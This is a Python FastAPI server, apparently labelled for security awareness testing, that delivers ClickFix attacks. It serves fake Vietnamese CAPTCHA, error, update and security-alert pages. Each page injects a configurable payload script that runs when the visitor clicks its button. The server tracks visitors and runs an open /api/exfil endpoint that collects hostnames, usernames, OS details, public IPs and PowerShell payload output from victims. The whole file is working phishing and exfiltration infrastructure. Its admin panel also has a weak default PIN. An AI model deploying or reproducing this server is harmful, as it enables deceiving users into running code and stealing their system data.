"""
ClickFix Web Server v2.0
Dynamic lure and payload delivery for security awareness testing.

Features:
  - Auto-discover lure configs from config/lures/*.yaml
  - Clean URL routing via 'route' field in lure YAML (e.g. /xac-minh, /cap-nhat)
  - Template auto-detection: place lures/<name>.html → auto-loaded
  - Per-lure payload override via YAML config
  - Hot-reload: GET /api/reload reloads all configs without restart
  - Admin dashboard at /admin
  - Visit & click tracking
"""

import yaml
from pathlib import Path
from typing import Dict, Any, Optional, List
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, PlainTextResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import uvicorn


# ─── Config Manager ────────────────────────────────────────────────────────────

class ConfigManager:
    """Manages all YAML configuration. Call load_configs() to hot-reload."""

    def __init__(self, config_dir: Path = None):
        self.config_dir = config_dir or Path(__file__).parent.parent / "config"
        self.config_dir.mkdir(exist_ok=True)
        self._main: Dict = {}
        self._lures: Dict[str, Dict] = {}
        self.load_configs()

    def load_configs(self):
        """Load or reload all configs from disk (main + all lure YAMLs)."""
        # --- main.yaml ---
        main_path = self.config_dir / "main.yaml"
        if main_path.exists():
            with open(main_path, "r", encoding="utf-8") as f:
                self._main = yaml.safe_load(f) or {}
        else:
            self._main = self._defaults()
            self._persist_main()

        # --- auto-discover lures/*.yaml ---
        self._lures = {}
        lures_dir = self.config_dir / "lures"
        if lures_dir.exists():
            for yml in sorted(lures_dir.glob("*.yaml")):
                with open(yml, "r", encoding="utf-8") as f:
                    cfg = yaml.safe_load(f)
                    if cfg:
                        self._lures[yml.stem] = cfg

    def _defaults(self) -> Dict:
        return {
            "app": {"name": "ClickFix Demo", "version": "3.0.0", "debug": False},
            "server": {"host": "0.0.0.0", "port": 8080},
            "payload": {"enabled": True, "default_script": "default.js", "per_lure": True},
            "tracking": {"enabled": True, "log_visits": True, "log_clicks": True},
            "lures": {"default": "cloudflare_captcha", "auto_discover": True},
            "admin": {"auth_required": True, "pin": "123456"},
        }

    def _persist_main(self):
        with open(self.config_dir / "main.yaml", "w", encoding="utf-8") as f:
            yaml.dump(self._main, f, default_flow_style=False, allow_unicode=True)

    # --- Properties ---

    @property
    def main(self) -> Dict:
        return self._main

    @property
    def lures(self) -> Dict[str, Dict]:
        return self._lures

    def get_lure(self, name: str) -> Optional[Dict]:
        return self._lures.get(name)

    def get_default_lure(self) -> str:
        return self._main.get("lures", {}).get("default", "captcha")

    def get_lure_by_route(self, route: str) -> Optional[tuple]:
        """Find lure name + config by its clean route slug."""
        route_clean = route.strip("/")
        for name, cfg in self._lures.items():
            lure_route = cfg.get("route", "").strip("/")
            if lure_route and lure_route == route_clean:
                return name, cfg
        return None

    def update_main(self, updates: Dict):
        self._main.update(updates)
        self._persist_main()


# ─── Payload Manager ──────────────────────────────────────────────────────────

class PayloadManager:
    """Serves payload files. Supports per-lure override via config."""

    def __init__(self, payloads_dir: Path = None):
        self.payloads_dir = payloads_dir or Path(__file__).parent.parent / "payloads"
        self.payloads_dir.mkdir(exist_ok=True)

    def get_payload(self, name: str) -> Optional[str]:
        path = self.payloads_dir / name
        return path.read_text(encoding="utf-8") if path.exists() else None

    def get_payload_for_lure(self, lure_config: Dict, default_script: str = "default.js") -> str:
        """
        Payload resolution order:
        1. lure_config.payload.script  (per-lure override)
        2. default_script              (from main.yaml)
        3. "// No payload configured"  (fallback)
        """
        script = lure_config.get("payload", {}).get("script", default_script)
        content = self.get_payload(script)
        if content:
            return content
        content = self.get_payload(default_script)
        return content or "// No payload configured"

    def list_payloads(self) -> List[Dict]:
        result = []
        for f in sorted(self.payloads_dir.glob("*")):
            if f.is_file():
                result.append({
                    "name": f.name,
                    "size": f.stat().st_size,
                    "extension": f.suffix,
                    "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
                })
        return result


# ─── App Setup ────────────────────────────────────────────────────────────────

app = FastAPI(title="ClickFix Demo", docs_url=None, redoc_url=None)

BASE_DIR = Path(__file__).parent
static_dir  = BASE_DIR / "static"
template_dir = BASE_DIR / "templates"

static_dir.mkdir(exist_ok=True)
template_dir.mkdir(exist_ok=True)
(template_dir / "lures").mkdir(exist_ok=True)

app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")
jinja = Jinja2Templates(directory=str(template_dir))

config_manager  = ConfigManager()
payload_manager = PayloadManager()

visit_log: List[Dict] = []
exfil_log: List[Dict] = []


# ─── Helpers ──────────────────────────────────────────────────────────────────

def log_visit(request: Request, lure: str, event: str = "visit"):
    if not config_manager.main.get("tracking", {}).get("enabled", True):
        return
    visit_log.append({
        "id": len(visit_log) + 1,
        "timestamp": datetime.now().isoformat(),
        "event": event,
        "lure": lure,
        "ip": request.client.host if request.client else "unknown",
        "user_agent": request.headers.get("user-agent", "unknown"),
        "referer": request.headers.get("referer", ""),
    })
    if len(visit_log) > 2000:
        del visit_log[:200]


def resolve_template(lure_config: Dict, lure_name: str) -> Optional[str]:
    """
    Template resolution order:
    1. lure_config.template  (explicit path like "lures/captcha.html")
    2. Auto-detect: templates/lures/<lure_name>.html
    3. None → fall back to dynamic Python generation
    """
    tmpl = lure_config.get("template", "dynamic")

    if tmpl != "dynamic":
        candidate = template_dir / tmpl
        if candidate.exists():
            return tmpl

    # Auto-detect
    auto = template_dir / "lures" / f"{lure_name}.html"
    if auto.exists():
        return f"lures/{lure_name}.html"

    return None


def build_context(request: Request, lure_name: str, lure_config: Dict) -> Dict:
    default_script = config_manager.main.get("payload", {}).get("default_script", "default.js")
    return {
        "request": request,
        "lure_name": lure_name,
        "lure_config": lure_config,
        "content": lure_config.get("content", {}),
        "styles": lure_config.get("styles", {}),
        "payload_content": payload_manager.get_payload_for_lure(lure_config, default_script),
        "app_name": config_manager.main.get("app", {}).get("name", "ClickFix"),
    }


async def _serve_lure(request: Request, lure_name: str, lure_config: Dict) -> HTMLResponse:
    """Shared lure serving logic."""
    log_visit(request, lure_name, "visit")
    ctx = build_context(request, lure_name, lure_config)
    tmpl_path = resolve_template(lure_config, lure_name)
    if tmpl_path:
        ctx_no_req = {k: v for k, v in ctx.items() if k != "request"}
        return jinja.TemplateResponse(request, tmpl_path, ctx_no_req)
    return _generate_dynamic_html(ctx)


# ─── Admin Authentication ──────────────────────────────────────────────────────

import secrets

current_session_token = secrets.token_hex(32)

def is_authenticated(request: Request) -> bool:
    admin_cfg = config_manager.main.get("admin", {})
    if not admin_cfg.get("auth_required", True):
        return True
    
    pin_config = admin_cfg.get("pin", "123456")
    if not pin_config:
        return True
        
    cookie_token = request.cookies.get("admin_session")
    return cookie_token == current_session_token


@app.middleware("http")
async def admin_auth_middleware(request: Request, call_next):
    path = request.url.path
    method = request.method
    
    is_admin_route = path.startswith("/admin") and path not in ["/admin/login", "/admin/logout"]
    is_admin_api = path.startswith("/api/") and not (
        path == "/api/track" or 
        (path == "/api/exfil" and method == "POST") or
        path.startswith("/api/payloads")
    )
    
    if (is_admin_route or is_admin_api) and not is_authenticated(request):
        if is_admin_api:
            return JSONResponse({"detail": "Không có quyền truy cập"}, status_code=401)
        return RedirectResponse(url="/admin/login", status_code=307)
        
    return await call_next(request)


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.get("/favicon.ico")
async def favicon():
    # Return a minimal 1x1 transparent ICO to avoid 404 noise
    ico = b"\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x18\x00\x30\x00\x00\x00\x16\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00"
    return Response(content=ico, media_type="image/x-icon")


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    default = config_manager.get_default_lure()
    cfg = config_manager.get_lure(default)
    if cfg:
        # Redirect to clean route if available, else /lure/<name>
        clean = cfg.get("route", "")
        if clean:
            return RedirectResponse(url=clean)
    return RedirectResponse(url=f"/lure/{default}")


@app.get("/lure/{lure_name}", response_class=HTMLResponse)
async def show_lure(request: Request, lure_name: str):
    """Original /lure/<name> route - kept for backwards compat."""
    lure_config = config_manager.get_lure(lure_name)
    if not lure_config:
        raise HTTPException(status_code=404, detail=f"Lure '{lure_name}' not found")
    return await _serve_lure(request, lure_name, lure_config)


# ─── API ──────────────────────────────────────────────────────────────────────

@app.post("/api/track")
async def track_event(request: Request):
    """Client-side click/interaction tracking."""
    try:
        data = await request.json()
        log_visit(request, data.get("lure", "unknown"), data.get("event", "click"))
        return JSONResponse({"status": "ok"})
    except Exception:
        return JSONResponse({"status": "error"}, status_code=400)


@app.get("/api/reload")
async def reload_configs():
    """Hot-reload all YAML configs from disk (no server restart needed)."""
    try:
        config_manager.load_configs()
        return JSONResponse({
            "status": "reloaded",
            "lures": list(config_manager.lures.keys()),
            "timestamp": datetime.now().isoformat(),
        })
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/config")
async def get_config():
    return JSONResponse(config_manager.main)


@app.post("/api/config")
async def update_config(request: Request):
    config_manager.update_main(await request.json())
    return JSONResponse({"status": "updated"})


@app.get("/api/lures")
async def list_lures():
    return JSONResponse({
        "default": config_manager.get_default_lure(),
        "lures": list(config_manager.lures.keys()),
        "configs": config_manager.lures,
    })


@app.get("/api/lures/{name}")
async def get_lure_config(name: str):
    cfg = config_manager.get_lure(name)
    if not cfg:
        raise HTTPException(status_code=404, detail="Not found")
    return JSONResponse(cfg)


@app.get("/api/payloads")
async def list_payloads():
    return JSONResponse({"payloads": payload_manager.list_payloads()})


@app.get("/api/payloads/{name}")
async def get_payload(name: str):
    content = payload_manager.get_payload(name)
    if content is None:
        raise HTTPException(status_code=404, detail="Not found")
    return PlainTextResponse(content)


@app.get("/api/logs")
async def get_logs():
    return JSONResponse({"total": len(visit_log), "visits": visit_log[-200:]})


@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_get(request: Request):
    if is_authenticated(request):
        return RedirectResponse(url="/admin", status_code=303)
    return jinja.TemplateResponse(request, "admin_login.html", {"request": request, "error": False})


@app.post("/admin/login")
async def admin_login_post(request: Request):
    body = await request.body()
    params = {}
    for pair in body.decode("utf-8").split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            # URL unquoting for values (simple replacement for form parameters)
            v = v.replace("+", " ")
            import urllib.parse
            v = urllib.parse.unquote(v)
            params[k] = v
            
    pin = params.get("pin", "")
    expected_pin = config_manager.main.get("admin", {}).get("pin", "123456")
    
    if pin == expected_pin:
        response = RedirectResponse(url="/admin", status_code=303)
        response.set_cookie(
            "admin_session", 
            current_session_token, 
            httponly=True, 
            samesite="lax"
        )
        return response
        
    return jinja.TemplateResponse(request, "admin_login.html", {
        "request": request,
        "error": True
    })


@app.get("/admin/logout")
async def admin_logout(request: Request):
    response = RedirectResponse(url="/admin/login", status_code=303)
    response.delete_cookie("admin_session")
    return response


@app.get("/admin", response_class=HTMLResponse)
async def admin_panel(request: Request):
    tmpl = template_dir / "admin.html"
    if not tmpl.exists():
        return HTMLResponse("<pre>Create web/templates/admin.html to enable admin panel.</pre>")

    visits = len([v for v in visit_log if v["event"] == "visit"])
    clicks = len([v for v in visit_log if v["event"] != "visit"])
    ips    = len({v["ip"] for v in visit_log})

    return jinja.TemplateResponse(request, "admin.html", {
        "config": config_manager.main,
        "lures": config_manager.lures,
        "logs": list(reversed(visit_log[-100:])),
        "payloads": payload_manager.list_payloads(),
        "stats": {
            "total_visits": visits,
            "total_clicks": clicks,
            "unique_ips": ips,
            "active_lures": len(config_manager.lures),
            "payloads": len(payload_manager.list_payloads()),
        },
    })


@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "version": config_manager.main.get("app", {}).get("version", "2.0.0"),
        "lures_loaded": len(config_manager.lures),
        "payloads_loaded": len(payload_manager.list_payloads()),
    }


# ─── Data Exfiltration Endpoint ─────────────────────────────────────────────────

@app.post("/api/exfil")
async def exfil_data(request: Request):
    """Receive data exfiltrated from PowerShell payloads."""
    try:
        data = await request.json()
        log_visit(request, data.get("lure", "exfil"), "exfil")
        
        # Store exfil data for admin viewing
        exfil_log.append({
            "id": len(exfil_log) + 1,
            "timestamp": datetime.now().isoformat(),
            "lure": data.get("lure", "unknown"),
            "hostname": data.get("hostname", ""),
            "username": data.get("username", ""),
            "os": data.get("os", ""),
            "public_ip": data.get("public_ip", ""),
            "payload_output": data.get("output", ""),
            "ip": request.client.host if request.client else "unknown",
            "user_agent": request.headers.get("user-agent", "unknown"),
        })
        if len(exfil_log) > 500:
            del exfil_log[:100]
        
        return JSONResponse({"status": "received", "data_id": len(exfil_log)})
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=400)


@app.get("/api/exfil")
async def get_exfil_logs():
    """Get exfiltration logs for admin."""
    return JSONResponse({
        "total": len(exfil_log),
        "logs": list(reversed(exfil_log[-100:])),
    })


# ─── Clean URL catch-all (MUST be last route) ─────────────────────────────────

@app.get("/{slug:path}", response_class=HTMLResponse)
async def route_by_slug(request: Request, slug: str):
    """
    Serve lures by clean slug configured in each lure's YAML 'route' field.
    Example: route: /xac-minh → accessible at GET /xac-minh
    This route MUST be registered last so it doesn't shadow other routes.
    """
    result = config_manager.get_lure_by_route(slug)
    if result:
        name, cfg = result
        return await _serve_lure(request, name, cfg)
    raise HTTPException(status_code=404, detail="Trang không tìm thấy")


# ─── Dynamic HTML fallback (backward compat) ──────────────────────────────────

def _generate_dynamic_html(ctx: Dict) -> HTMLResponse:
    lure_type = ctx["lure_config"].get("type", "captcha")
    fn = {
        "captcha":      _gen_captcha,
        "error":        _gen_error,
        "update":       _gen_update,
        "update_error": _gen_update,
        "alert":        _gen_alert,
    }.get(lure_type, _gen_default)
    return HTMLResponse(content=fn(ctx))


def _gen_captcha(ctx):
    c = ctx["content"]
    title = c.get("title", "Xác minh bạn là người thật")
    instr = c.get("instructions", "Nhấn vào nút bên dưới để xác minh")
    p     = ctx["payload_content"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Xác minh bảo mật</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,sans-serif;
background:#f2f2f2;min-height:100vh;display:flex;justify-content:center;align-items:center}}
.box{{background:#fff;border:1px solid#ddd;border-radius:4px;padding:40px;max-width:420px;
width:90%;text-align:center}}.icon{{font-size:48px;margin-bottom:16px}}.title{{font-size:20px;
font-weight:600;margin-bottom:8px}}.sub{{color:#666;margin-bottom:24px}}.btn{{background:#f6821f;
color:#fff;border:none;padding:12px 32px;font-size:16px;border-radius:4px;cursor:pointer}}
.btn:hover{{background:#e6720f}}</style></head><body>
<div class="box"><div class="icon">🛡️</div>
<h1 class="title">{title}</h1><p class="sub">{instr}</p>
<button class="btn" onclick="go()">Xác minh</button></div>
<script>{p}
function go(){{try{{runClickFixPayload()}}catch(e){{}}alert("Đã xác minh!");}}</script></body></html>"""


def _gen_error(ctx):
    c = ctx["content"]
    p = ctx["payload_content"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Lỗi hệ thống</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;
background:#1a1a2e;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center}}
.box{{background:#16213e;border:1px solid #e94560;border-radius:12px;padding:40px;max-width:480px}}
.icon{{font-size:48px;margin-bottom:16px}}.title{{color:#e94560;font-size:22px;margin-bottom:12px}}
.code{{background:#0f0f23;padding:12px;border-radius:6px;font-family:monospace;font-size:12px;margin:16px 0}}
.btn{{background:#e94560;color:#fff;border:none;padding:12px 28px;border-radius:6px;cursor:pointer}}
.btn:hover{{background:#ff6b6b}}</style></head><body>
<div class="box"><div class="icon">⚠️</div>
<h1 class="title">{c.get("error_title","Lỗi hệ thống")}</h1>
<p>{c.get("error_message","Đã xảy ra lỗi")}</p>
<div class="code">Error: 0x80070005 | Access Denied</div>
<button class="btn" onclick="fix()">Sửa lỗi</button></div>
<script>{p}
function fix(){{try{{runClickFixPayload()}}catch(e){{}}alert("Đã sửa!");}}</script></body></html>"""


def _gen_update(ctx):
    c = ctx["content"]
    p = ctx["payload_content"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cập nhật hệ thống</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;
background:#f3f3f3;color:#1a1a1a;min-height:100vh;display:flex;justify-content:center;align-items:center}}
.box{{background:#fff;border:1px solid#e0e0e0;border-radius:12px;padding:40px;text-align:center;max-width:440px}}
.icon{{font-size:48px;margin-bottom:16px}}.title{{font-size:22px;font-weight:600;margin-bottom:8px}}
.sub{{color:#666;margin-bottom:20px}}.bar{{width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin:16px 0}}
.fill{{height:100%;background:#0067c0;animation:p 3s ease forwards;width:0}}
@keyframes p{{to{{width:94%}}}}.btn{{background:#0067c0;color:#fff;border:none;padding:12px 28px;
font-size:14px;border-radius:4px;cursor:pointer;margin-top:12px}}.btn:hover{{background:#005ba3}}</style></head><body>
<div class="box"><div class="icon">🔄</div>
<h1 class="title">{c.get("title","Cập nhật bắt buộc")}</h1>
<p class="sub">{c.get("description","Đang tải bản cập nhật bảo mật...")}</p>
<div class="bar"><div class="fill"></div></div>
<button class="btn" onclick="install()">Cài đặt bản cập nhật</button></div>
<script>{p}
function install(){{try{{runClickFixPayload()}}catch(e){{}}alert("Đã cài đặt!");}}</script></body></html>"""


def _gen_alert(ctx):
    c = ctx["content"]
    p = ctx["payload_content"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cảnh báo bảo mật</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:Arial,sans-serif;
background:#1a0a0a;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center}}
.box{{background:linear-gradient(145deg,#8b0000,#4a0000);border:3px solid #ff4444;border-radius:20px;
padding:48px;text-align:center;max-width:500px}}
.icon{{font-size:72px;margin-bottom:16px}}.title{{font-size:28px;font-weight:700;margin-bottom:16px}}
.msg{{font-size:16px;margin-bottom:28px;line-height:1.6}}.btn{{background:#ff4444;color:#fff;border:2px solid #fff;
padding:15px 40px;font-size:17px;font-weight:700;border-radius:50px;cursor:pointer}}
.btn:hover{{background:#ff6666}}</style></head><body>
<div class="box"><div class="icon">🚨</div>
<h1 class="title">{c.get("title","Cảnh báo bảo mật!")}</h1>
<p class="msg">{c.get("message","Máy tính của bạn có thể đang bị tấn công.")}</p>
<button class="btn" onclick="protect()">Bảo vệ ngay</button></div>
<script>{p}
function protect(){{try{{runClickFixPayload()}}catch(e){{}}alert("Đã bảo vệ!");}}</script></body></html>"""


def _gen_default(ctx):
    p = ctx["payload_content"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Thao tác bắt buộc</title>
<style>body{{font-family:sans-serif;background:#1e1e2e;color:#cdd6f4;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}}
.box{{text-align:center;padding:40px}}button{{background:#cba6f7;color:#1e1e2e;border:none;
padding:12px 28px;font-size:15px;border-radius:8px;cursor:pointer;margin-top:16px}}</style></head><body>
<div class="box"><h1>Yêu cầu thao tác</h1><p>Nhấn nút bên dưới để tiếp tục.</p>
<button onclick="go()">Tiếp tục</button></div>
<script>{p}
function go(){{try{{runClickFixPayload()}}catch(e){{}}alert("Hoàn tất!");}}</script></body></html>"""


# ─── Entry point ──────────────────────────────────────────────────────────────

def run_server(host: str = "0.0.0.0", port: int = 8080):
    uvicorn.run(app, host=host, port=port)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ClickFix Web Server v2.0")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()
    run_server(args.host, args.port)